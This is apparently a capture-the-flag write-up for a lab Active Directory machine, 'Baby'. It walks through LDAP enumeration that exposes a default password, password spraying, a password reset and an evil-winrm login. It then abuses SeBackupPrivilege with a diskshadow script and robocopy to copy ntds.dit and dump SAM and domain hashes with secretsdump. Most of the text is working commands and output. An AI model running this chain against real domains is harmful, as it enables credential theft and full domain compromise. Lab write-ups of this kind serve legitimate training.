# User

LDAP ENUM
```
└─$ ldapsearch -x -H ldap://BabyDC.baby.vl -b "DC=baby,DC=vl" "(objectClass=person)"
# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Teresa Bell
sn: Bell
description: Set initial password to BabyStart123!
givenName: Teresa
distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151437.0Z
displayName: Teresa Bell
uSNCreated: 12889
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12905
name: Teresa Bell
objectGUID:: EDGXW4JjgEq7+GuyHBu3QQ==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819812778759642
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Teresa.Bell
sAMAccountType: 805306368
userPrincipalName: Teresa.Bell@baby.vl

```

`Teresa.Bell:BabyStart123!`

emails:
```
Jacqueline.Barnett@baby.vl
Ashley.Webb@baby.vl
Hugh.George@baby.vl
Leonard.Dyer@baby.vl
Connor.Wilkinson@baby.vl
Joseph.Hughes@baby.vl
Kerry.Wilson@baby.vl
Teresa.Bell@baby.vl
```
found different names using
`ldapsearch -x -H ldap://BabyDC.baby.vl -b "DC=baby,DC=vl" "*" `
```
Ian Walker
Caroline Robinson
```

```
nxc ldap baby.vl -u emails.txt -p 'BabyStart123!'                                                       
LDAP        10.129.234.71   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Ian.Walker:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

using smbpasswd we set the password as `Password123`

`evil-winrm -u Caroline.Robinson -p Password123 -i baby.vl`

user.txt -> `8e3abedb9c35ac1f49cf4aab8e495ec5`
# Root

`whoami /priv`
`SeBackupPrivilege             Back up files and directories  Enabled`
[SeBackupPrivilege](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md)


```
└─$ sudo impacket-secretsdump -sam sam.hive -system system.hive LOCAL
[sudo] password for maty-work: 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 

```

domain hash dumping


```

script.txt==

set verbose on  
set metadata C:\Windows\Temp\test.cab  
set context persistent  
add volume C: alias cdrive  
create  
expose %cdrive% E:

unix2dos script.txt
upload script.txt script.txt
diskshadow /s script.txt

robocopy /b E:\Windows\ntds . ntds.dit

download ntds.dit ntds.dit

secretsdump.py -ntds ntds.dit -system system LOCAL
```

root.txt
`49bfad74583f89647f87ef7ec2832742
`

